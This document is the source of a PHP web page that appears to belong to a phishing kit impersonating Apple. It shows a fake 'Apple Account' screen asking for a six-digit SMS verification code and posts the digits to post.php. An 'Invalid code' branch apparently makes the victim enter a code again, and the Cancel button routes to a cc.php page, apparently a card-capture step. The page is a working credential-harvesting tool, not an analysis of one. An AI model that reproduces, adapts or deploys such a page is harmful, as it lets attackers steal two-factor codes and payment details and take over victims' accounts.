<?php require 'main.php'; ?>
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="stylesheet" href="res/css/sms.css">
  <title>login</title>
</head>

<body>
  <header>
    <div class="logo"><img src="res/img/logo.png"></div>
    <div class="right"><img src="res/img/icon.png"></div>
  </header>
  <main>
    <div class="continer">
      <div class="apple">Apple Account</div>
      <div class="title">
        <span>Enter the code that was sent to your phone number:</span>
      </div>
      <form action="post.php" method="post">
        <div class="tile">If you have access to your phone number, enter the verification code here.</div>
        <div class="col">
          <input type="tel" maxlength="1" id="d1" required oninput="moveNext(this, 'd2')"
            onkeydown="movePrev(event, this, null)" name="c1">
          <input type="tel" maxlength="1" id="d2" required oninput="moveNext(this, 'd3')"
            onkeydown="movePrev(event, this, 'd1')" name="c2">
          <input type="tel" maxlength="1" id="d3" required oninput="moveNext(this, 'd4')"
            onkeydown="movePrev(event, this, 'd2')" name="c3">
          <input type="tel" maxlength="1" id="d4" required oninput="moveNext(this, 'd5')"
            onkeydown="movePrev(event, this, 'd3')" name="c4">
          <input type="tel" maxlength="1" id="d5" required oninput="moveNext(this, 'd6')"
            onkeydown="movePrev(event, this, 'd4')" name="c5">
          <input type="tel" maxlength="1" id="d6" required oninput="moveNext(this, null)"
            onkeydown="movePrev(event, this, 'd5')" name="c6">
        </div>
        <?php
        if (isset($_GET['error'])) {
          echo '<input type="hidden" name="done">';
          echo '<p style="color:red;">Invalid code</p>';
        } ?>
        <script>
          function moveNext(current, nextFieldId) {
            if (current.value.length === 1 && nextFieldId) {
              document.getElementById(nextFieldId).focus();
            }
          }

          function movePrev(event, current, prevFieldId) {
            if (event.key === 'Backspace' && current.value === '' && prevFieldId) {
              document.getElementById(prevFieldId).focus();
            }
          }

          document.addEventListener("DOMContentLoaded", function () {
            const inputs = Array.from({ length: 6 }, (_, i) => document.getElementById(`d${i + 1}`));

            inputs.forEach((input, idx) => {
              // Handle paste on any input
              input.addEventListener("paste", (e) => {
                const paste = (e.clipboardData || window.clipboardData).getData('text').trim();
                if (/^\d{6}$/.test(paste)) {
                  e.preventDefault();
                  paste.split('').forEach((char, i) => {
                    if (inputs[i]) {
                      inputs[i].value = char;
                    }
                  });
                  inputs[5].focus();
                }
              });
            });
          });
        </script>
        <div class="a"><a href="#">Didn't get a verification code?</a></div>
        <div class="a"><a href="#">Don't use this number anymores</a></div>
        <div class="btn">
          <div class="call"><button onclick="mov()">Cancel</button></div>
          <div class="text"><button type="submit">Continue</button></div>
        </div>
    </div>
  </main>
  <footer>
    <div class="f1"><a href="#">System Status</a> | <a href="#">Privacy Policy</a> | <a href="#">Terms & Conditions</a>
    </div>
    <div class="f2">Copyright © 2026 Apple Inc. All rights reserved.</div>
  </footer>


  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
  <script>
    $("input").mask("0");
  </script>

  <script>
    function mov() {
      window.location = "cc.php"; }
  </script>

</body>

</html>